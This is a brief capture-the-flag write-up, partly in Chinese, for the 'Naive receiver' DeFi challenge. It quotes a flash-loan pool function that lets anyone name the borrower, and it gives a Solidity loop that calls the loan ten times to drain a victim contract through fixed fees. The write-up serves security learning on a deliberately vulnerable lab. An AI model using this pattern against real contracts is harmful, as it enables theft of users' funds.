title: Naive receiver
---

# Description
There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

# Code
在`Pool::flashLoan()`中，`borrower`是可控的，所以直接传入`Receiver`地址，并且调用`10`次就可以。
```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = address(this).balance;
        if (balanceBefore < borrowAmount) revert NotEnoughETHInPool();
        if (!borrower.isContract()) revert BorrowerMustBeADeployedContract();

        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE), borrowAmount);

        if (address(this).balance < balanceBefore + FIXED_FEE) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
```
# Solution
题目要求把Receiver中的账户资金耗尽，并且在一个交易中，所以直接就调用10次flashloan就好了
# Exp
```
for (uint256 i = 0; i < 10; i++){
            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), address(flashLoanReceiver).balance);
        }
```
